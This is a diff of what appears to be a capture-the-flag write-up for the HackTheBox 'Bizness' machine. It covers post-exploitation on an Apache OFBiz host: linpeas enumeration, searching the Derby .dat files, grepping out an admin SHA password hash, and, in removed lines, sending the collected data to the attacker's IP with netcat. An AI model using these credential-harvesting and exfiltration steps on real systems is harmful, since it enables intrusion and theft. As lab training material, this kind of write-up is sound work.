@@ -188,40 +188,11 @@ ofbiz@bizness:~$ chmod +x linpeas.sh
 /var/lib/pam/password
 ```
 
-After a lot of searching for anything of interest and a ton of `find` commands, we manage to get something promising back:
+After going through the linpeas results, we can't find anything interesting, except we can see a file called `passwords.dat`. According to [howtogeek](https://www.howtogeek.com/363326/what-is-a-dat-file-and-how-do-i-open-one/#what-is-a-dat-file):
 
-```bash
-ofbiz@bizness:/opt/ofbiz$ find / -type f -iname *admin* 2>/dev/null
-<SNIP>
-/opt/ofbiz/framework/resources/templates/AdminUserLoginData.xml
+> A file with the `.dat` file extension is **a generic data file that stores specific information relating to the program that created the file**. A DAT file **contains important information for software to handle**, usually either in plain text or binary format.
 
-ofbiz@bizness:/opt/ofbiz$ cat /opt/ofbiz/framework/resources/templates/AdminUserLoginData.xml
-
-<SNIP>
-
-<entity-engine-xml>
-    <UserLogin userLoginId="@userLoginId@" currentPassword="{SHA}47ca69ebb4bdc9ae0adec130880165d2cc05db1a" requirePasswordChange="Y"/>
-    <UserLoginSecurityGroup groupId="SUPER" userLoginId="@userLoginId@" fromDate="2001-01-01 12:00:00.0"/>
-</entity-engine-xml>
-```
-
-We get the hashed password of a user, so let's its type and try to crack it:
-
-```bash
-$ hash-identifier
-
- HASH: 47ca69ebb4bdc9ae0adec130880165d2cc05db1a
-
-Possible Hashs:
-[+] SHA-1
-[+] MySQL5 - SHA-1(SHA-1($pass))
-
-<SNIP>
-
-
-```
-
-To-do: What are derby files and why search look for them???
+We can search for DAT files to see what comes back:
 
 ```bash
 # search for '.dat' files
@@ -242,7 +213,19 @@ ofbiz@bizness:~$ find / -type f -name '*.dat' 2>/dev/null
 /opt/ofbiz/runtime/data/derby/ofbiz/seg0/c11601.dat
 
 <SNIP>
+```
 
+From the output we can see that the `ofbiz` app generates a lot of `.dat` files inside the `derby` directory. [**Apache Derby**](https://www.cloudduggu.com/derby/introduction/) is an open-source Java-based fully transactional **relational database system (RDBMS)**. It seems that the `ofbiz` app uses the Apache Derby RDBMS which in turn generates a lot of `.dat` files. 
+
+After reading a lot about Derby and DAT files, I believe this [post](https://stackoverflow.com/questions/61401486/is-there-a-general-convention-for-naming-files-and-folders) explains best what's the situation here:
+
+> "...I believe your files (in this case the `derby/ofbiz/seg0/<name>.dat` files) have some sort of data structure that is parsed by your program, forming some sort of database with folders and users... thus your files are data files (ending with `.dat` as a convention)."
+
+Let's combine all the files' content into a big file, so we can then use `grep` to search for interesting info:
+
+WHY NOT DO THAT ON THE MACHINE ITSELF?
+
+```bash
 # combine all files' content into one file
 ofbiz@bizness:~$ find / -type f -name '*.dat' 2>/dev/null | xargs cat > dat_file
 cat: /var/cache/debconf/passwords.dat: Permission denied
@@ -254,43 +237,11 @@ ofbiz@bizness:~$ wc -l dat_files.txt
 173992 dat_files.txt
 ```
 
-We can transfer the file to our machine by first opening a server ready to receive the data:
+Everything looks good, so we can begin looking for things of interest. After a while we can find a **SHA-1** hash:
 
 ```bash
-$ nc -nvlp 8888 > dat_files.txt
-listening on [any] 8888 ...
-connect to [10.10.14.11] from (UNKNOWN) [10.10.11.252] 55542
-```
-
-And then send the file from the target:
-
-```bash
-# sending the file to the target socket
-ofbiz@bizness:~$ netcat -n 10.10.14.11 8888 < dat_files.txt
-```
-
-Let's check if the file is here and its line-count:
-
-```bash
-$ ls
-dat_files.txt  hash  linpeas_out
-
-$ wc -l dat_files.txt
-173992 dat_files.txt
-```
-
-Everything looks good, so lets search its content for any **SHA-1** hashes:
-
-```bash
-$ strings dat_files.txt | grep SHA
-SHAREHOLDER
-SHAREHOLDER
+ofbiz@bizness:~$ strings dat_file | grep -i password | grep -i admin
                 <eeval-UserLogin createdStamp="2023-12-16 03:40:23.643" createdTxStamp="2023-12-16 03:40:23.445" currentPassword="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" enabled="Y" hasLoggedOut="N" lastUpdatedStamp="2023-12-16 03:44:54.272" lastUpdatedTxStamp="2023-12-16 03:44:54.213" requirePasswordChange="N" userLoginId="admin"/>
-SHA-256
-"$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
-MARSHALL ISLANDS
-SHA-256
-SHA-256
 ```
 
 Let's try to crack this:
